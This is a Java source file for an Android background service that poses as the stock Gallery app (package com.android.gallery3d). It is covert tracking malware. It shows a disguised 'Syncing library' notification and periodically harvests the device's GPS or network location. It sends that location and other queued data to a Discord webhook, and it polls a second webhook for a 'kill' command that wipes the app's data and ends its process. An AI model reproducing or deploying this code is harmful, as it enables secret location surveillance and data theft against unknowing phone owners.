package com.android.gallery3d;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.IBinder;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;

public class BeaconService extends Service {

    // FILL: two separate private Discord channels
    public static final String WEBHOOK_SEND = "https://discord.com/api/webhooks/ID/TOKEN";
    public static final String WEBHOOK_KILL = "https://discord.com/api/webhooks/ID2/TOKEN2";

    private static final Queue<String> queue = new ConcurrentLinkedQueue<>();
    private volatile boolean running = true;

    public static void queue(Context ctx, String s) {
        queue.add(s);
        ctx.startForegroundService(new Intent(ctx, BeaconService.class));
    }

    public static void selfDestruct(Context ctx) {
        try { Runtime.getRuntime().exec(new String[]{"sh","-c","pm clear " + ctx.getPackageName()}); } catch (Exception ignored) {}
        ctx.stopService(new Intent(ctx, BeaconService.class));
        android.os.Process.killProcess(android.os.Process.myPid());
    }

    @Override public void onCreate() {
        super.onCreate();
        String ch = "f";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel c = new NotificationChannel(ch, "Files", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(c);
        }
        Notification n = new Notification.Builder(this, ch)
            .setContentTitle("Files").setContentText("Syncing library")
            .setSmallIcon(android.R.drawable.ic_menu_gallery)
            .setPriority(Notification.PRIORITY_MIN).build();
        startForeground(1, n);

        new Thread(this::loop).start();
    }

    private void loop() {
        long startTime = System.currentTimeMillis();
        long lastKillCheck = 0;
        long lastLocation = startTime;
        long lastFlush = startTime;

        try { Thread.sleep(300_000); } catch (InterruptedException e) { return; }

        while (running) {
            try { Thread.sleep(60_000); } catch (InterruptedException e) { return; }

            long now = System.currentTimeMillis();

            if (now - lastLocation > 7_200_000) {
                lastLocation = now;
                try {
                    LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                    Location l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (l != null) queue.add("LOC|" + l.getLatitude() + "," + l.getLongitude());
                } catch (Exception ignored) {}
            }

            if (now - lastFlush > 600_000) {
                lastFlush = now;
                StringBuilder batch = new StringBuilder();
                while (!queue.isEmpty()) batch.append(queue.poll()).append('\n');
                if (batch.length() > 0) post(WEBHOOK_SEND, batch.toString());
            }

            if (now - lastKillCheck > 300_000) {
                lastKillCheck = now;
                String cmd = pollKill();
                if (cmd != null && cmd.toLowerCase().contains("kill")) {
                    running = false;
                    selfDestruct(this);
                    return;
                }
            }
        }
    }

    private void post(String url, String content) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setDoOutput(true);
            String body = new JSONObject().put("content", content.substring(0, Math.min(1900, content.length()))).toString();
            c.getOutputStream().write(body.getBytes());
            c.getResponseCode();
        } catch (Exception ignored) {}
    }

    private String pollKill() {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(WEBHOOK_KILL + "?limit=5").openConnection();
            c.setRequestMethod("GET");
            if (c.getResponseCode() != 200) return null;
            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder(); String line;
            while ((line = r.readLine()) != null) sb.append(line);
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
}
